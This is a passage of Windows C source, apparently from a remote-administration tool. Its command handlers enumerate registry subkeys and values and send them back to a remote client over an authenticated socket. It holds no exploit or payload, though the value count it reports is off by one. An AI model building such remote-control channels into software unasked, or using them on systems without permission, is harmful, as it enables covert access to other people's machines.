			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return 1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 
	
	
	// Enumerate Keys
	int nCount;
	char svKeyBuf[MAX_PATH+1];
	nCount=0;

	IssueAuthCommandReply(cas_from,comid,1,"Subkeys:\n");

	while(RegEnumKey(key,nCount,svKeyBuf,MAX_PATH)==ERROR_SUCCESS) {
		RegOpenKey(key,svKeyBuf,&subkey);
		DWORD keycount;
		RegQueryInfoKey(subkey,NULL,NULL,NULL,&keycount,NULL,NULL,NULL,NULL,NULL,NULL,NULL);
		if(keycount>0) {
			wsprintf(svBuffer,"  %s\\\n",svKeyBuf);
		} else {
			wsprintf(svBuffer,"  %s\n",svKeyBuf);
		}
		RegCloseKey(subkey);
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);
		nCount++;
	}
	wsprintf(svBuffer,"%d keys\n",nCount);
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		
	// Clean up
	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
		RegCloseKey(key);

	return 0;
}

int CmdProc_RegEnumValues(CAuthSocket *cas_from, int comid, DWORD nArg1, char *svArg2, char *svArg3)
{
	char svBuffer[1024];
	
	// Get root key
	char *svKey,*svNext;
	HKEY key;
	svKey=GetRootKey(svArg2,&key);
	if(svKey==NULL) {
		IssueAuthCommandReply(cas_from,comid,0,"Unable to list values. Invalid root key.\n");
		return -1;
	}

	// Open key hierarchy
	HKEY subkey;
	DWORD dwPerm=KEY_READ;
	while(svKey!=NULL) {
		svNext=BreakString(svKey,"\\");
		if(svNext==NULL) dwPerm=KEY_READ|KEY_WRITE;
		if(RegOpenKeyEx(key, svKey, 0, dwPerm, &subkey) != ERROR_SUCCESS) {
			if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
				RegCloseKey(key);
			wsprintf(svBuffer,"Unable to open subkey: %.256s\n", svKey);
			IssueAuthCommandReply(cas_from,comid,0,svBuffer);
			return 1;
		}
		
		if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
			RegCloseKey(key);
		key = subkey;
		svKey = svNext;
	} 
	
	
	// Enumerate values
	int nCount;
	char svValueBuf[MAX_PATH+1];
	nCount=0;
	DWORD dwType, dwValueLen;
	char *svType;
	
	IssueAuthCommandReply(cas_from,comid,1,"Value type/names:\n");
	dwValueLen=MAX_PATH;
	while(RegEnumValue(key,nCount,svValueBuf,&dwValueLen,NULL,&dwType,NULL,NULL)==ERROR_SUCCESS) {
		switch(dwType) {
		case REG_BINARY: svType="BINARY"; break;
		case REG_DWORD: svType="DWORD"; break;
		case REG_EXPAND_SZ: svType="EXPAND_SZ"; break;
		case REG_LINK: svType="LINK"; break;
		case REG_MULTI_SZ: svType="MULTI_SZ"; break;
		case REG_RESOURCE_LIST: svType="RESOURCE_LIST"; break;
		case REG_SZ: svType="SZ"; break;
		case REG_NONE: svType="NONE"; break;
		default: svType="UNKNOWN"; break;
		}

		wsprintf(svBuffer,"REG_%s: %s\n",svType,svValueBuf);
		
		IssueAuthCommandReply(cas_from,comid,1,svBuffer);
		nCount++;
		dwValueLen=MAX_PATH;
	}
	
/*	// Spit out default value as well
	RegQueryValueEx(key,"",NULL,&dwType,NULL,NULL);
	switch(dwType) {
	case REG_BINARY: svType="BINARY"; break;
	case REG_DWORD: svType="DWORD"; break;
	case REG_EXPAND_SZ: svType="EXPAND_SZ"; break;
	case REG_LINK: svType="LINK"; break;
	case REG_MULTI_SZ: svType="MULTI_SZ"; break;
	case REG_RESOURCE_LIST: svType="RESOURCE_LIST"; break;
	case REG_SZ: svType="SZ"; break;
	case REG_NONE: svType="NONE"; break;
	default: svType="UNKNOWN"; break;
	}
	wsprintf(svBuffer,"REG_%s: \n",svType);
	IssueAuthCommandReply(cas_from,comid,1,svBuffer);
*/
	
	wsprintf(svBuffer,"%d values\n",nCount+1);
	IssueAuthCommandReply(cas_from,comid,0,svBuffer);
		
	// Clean up
	if(key!=HKEY_LOCAL_MACHINE && key!=HKEY_USERS && key!=HKEY_CLASSES_ROOT && key!=HKEY_CURRENT_USER && key!=HKEY_CURRENT_CONFIG && key!=HKEY_DYN_DATA) 
		RegCloseKey(key);

	return 0;
}






